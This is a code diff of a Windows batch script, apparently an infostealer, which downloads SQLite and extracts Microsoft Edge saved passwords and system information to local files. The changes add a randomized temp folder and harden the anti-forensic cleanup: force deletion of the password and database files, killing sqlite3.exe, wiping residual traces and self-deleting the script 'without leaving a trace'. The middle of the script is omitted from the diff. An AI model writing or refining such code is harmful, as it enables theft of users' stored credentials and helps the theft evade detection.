@@ -1,18 +1,19 @@
 @echo off
 echo Hello! Made by Shane.
 
-:: Create a temporary directory for SQLite tools
-if not exist "%TEMP%\sqltmp" mkdir "%TEMP%\sqltmp"
+:: Set temporary directory for SQLite tools
+set "SQLTMP=%TEMP%\sqltmp_%RANDOM%"
+mkdir "%SQLTMP%" 2>nul
 
 :: Download SQLite3 if not present
-if not exist "%TEMP%\sqltmp\sqlite3.exe" (
+if not exist "%SQLTMP%\sqlite3.exe" (
     echo Downloading SQLite3...
-    curl -L -o "%TEMP%\sqltmp\sqlite3.zip" "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
-    tar -xf "%TEMP%\sqltmp\sqlite3.zip" -C "%TEMP%\sqltmp"
-    move "%TEMP%\sqltmp\sqlite-tools-win32-x86-3430100\sqlite3.exe" "%TEMP%\sqltmp\sqlite3.exe" >nul
+    curl -L -o "%SQLTMP%\sqlite3.zip" "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430100.zip"
+    tar -xf "%SQLTMP%\sqlite3.zip" -C "%SQLTMP%"
+    move "%SQLTMP%\sqlite-tools-win32-x86-3430100\sqlite3.exe" "%SQLTMP%\sqlite3.exe" >nul
 )
 
-set "SQLITE3=%TEMP%\sqltmp\sqlite3.exe"
+set "SQLITE3=%SQLTMP%\sqlite3.exe"
 
 :: Extract Edge saved passwords
 echo Edge Saved Passwords > edge_passwords.txt
@@ -99,12 +100,23 @@ if exist edge_login_data_copy.db (
 
 :: Clean up all files
 echo Cleaning up...
-del sysinfo.txt
-del edge_passwords.txt
-if exist edge_login_data_copy.db del edge_login_data_copy.db
+del /f /q sysinfo.txt 2>nul
+del /f /q edge_passwords.txt 2>nul
+if exist edge_login_data_copy.db del /f /q edge_login_data_copy.db 2>nul
 
-:: Clean up SQLite tools
-if exist "%TEMP%\sqltmp" rmdir /s /q "%TEMP%\sqltmp"
+:: Clean up SQLite tools and temporary directory (force delete all traces)
+if exist "%SQLTMP%" (
+    echo Removing SQLite tools...
+    taskkill /f /im sqlite3.exe 2>nul
+    rmdir /s /q "%SQLTMP%" 2>nul
+)
+
+:: Clear any residual files in temp that might match
+if exist "%TEMP%\sqlite-tools-win32-x86-3430100" rmdir /s /q "%TEMP%\sqlite-tools-win32-x86-3430100" 2>nul
+if exist "%TEMP%\sqltmp" rmdir /s /q "%TEMP%\sqltmp" 2>nul
+if exist "%TEMP%\sqltmp_*" rmdir /s /q "%TEMP%\sqltmp_*" 2>nul
+if exist "%TEMP%\sqlite3.zip" del /f /q "%TEMP%\sqlite3.zip" 2>nul
+if exist "%TEMP%\sqlite3.exe" del /f /q "%TEMP%\sqlite3.exe" 2>nul
 
 :: Self-delete the batch file without leaving a trace
 (goto) 2>nul & del "%~f0"
